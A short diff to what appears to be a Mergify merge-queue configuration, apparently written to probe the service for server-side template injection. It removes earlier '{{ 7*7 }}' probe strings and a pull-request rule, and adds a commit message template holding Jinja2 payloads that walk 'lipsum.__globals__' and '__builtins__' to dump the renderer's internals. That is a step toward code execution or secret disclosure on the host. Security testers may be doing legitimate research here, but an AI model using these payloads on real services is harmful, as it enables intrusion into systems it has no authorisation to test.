@@ -2,15 +2,7 @@ queue_rules:
   - name: default
     queue_conditions: []
     merge_conditions: []
-    merge_method: merge
+    merge_method: squash
     commit_message_template: |
-      SSTI MERGE: {{ 7*7 }}
-
-pull_request_rules:
-  - name: SSTI rule
-    conditions:
-      - base=master
-      - title~=^SSTI10
-    actions:
-      comment:
-        message: "SSTI comment: {{ 7*7 }}"
+      GLOBALS: {{ [lipsum]|map(attribute="__globals__")|pprint }}
+      BUILTINS: {{ [lipsum]|map(attribute="__globals__")|list|first|attr("__builtins__")|pprint }}
